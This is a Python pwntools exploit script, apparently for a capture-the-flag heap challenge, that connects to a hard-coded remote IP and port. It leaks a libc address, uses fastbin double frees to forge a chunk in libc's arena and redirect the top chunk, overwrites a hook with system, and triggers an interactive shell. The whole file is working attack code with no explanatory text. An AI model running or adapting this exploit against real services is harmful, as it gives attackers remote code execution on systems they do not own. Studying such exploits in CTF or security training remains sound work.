#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.6"
#port = 8888
#host = "128.199.85.217"
host = "128.199.247.60"
port = 10001
r = remote(host,port)


def alloca(size,data):
    r.recvuntil("5. Run away")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(size))
    time.sleep(0.1)
    r.sendline(data)

def free(idx):
    r.recvuntil("5. Run away")
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(idx))

def read(idx):
    r.recvuntil("5. Run away")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(idx))


alloca(128,"ddaa")
alloca(0x48,"ddaa")
free(0)
read(0)
r.recvuntil(" ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c3b78
print "libc:",hex(libc)
alloca(0x48,"ddaa")
free(1)
free(2)
free(1)
system = libc + 0x45390
alloca(0x60,"ddaa") #3
alloca(0x60,"ddaa") #4
free(3)
free(4)
free(3)
alloca(0x60,p64(0x51)) #5
alloca(0x60,p64(0x51)) #6 
alloca(0x60,p64(0x51)) #7
fake = libc + 0x3c3b48
alloca(0x48,p64(fake))
alloca(0x48,p64(fake))
alloca(0x48,p64(fake))
top = libc + 0x3c4710
alloca(0x48,p64(0)*4 + p64(top)) 
alloca(0x300,"sh\x00") #12
alloca(0x300,"ddaa") #13
alloca(0x300,"ddaa")
alloca(0x300,"ddaa")
alloca(0x300,"ddaa")
alloca(0x300,"\x00"*0x138 + p64(system))
free(12)
r.interactive()
